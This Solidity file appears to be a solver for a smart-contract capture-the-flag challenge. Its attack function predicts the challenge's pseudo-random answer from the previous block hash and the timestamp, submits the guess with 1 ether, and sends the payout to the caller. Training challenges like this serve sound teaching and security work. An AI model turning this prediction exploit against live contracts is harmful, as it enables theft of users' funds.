// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "./GuessTheRandomNumberChallenge.sol";

contract GuessTheRandomNumberSolver {
    function attack(GuessTheRandomNumberChallenge challenge) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        challenge.guess.value(1 ether)(answer);
        msg.sender.transfer(address(this).balance);
    }

    // Fallback function to receive ETH from challenge
    function () public payable {}
}
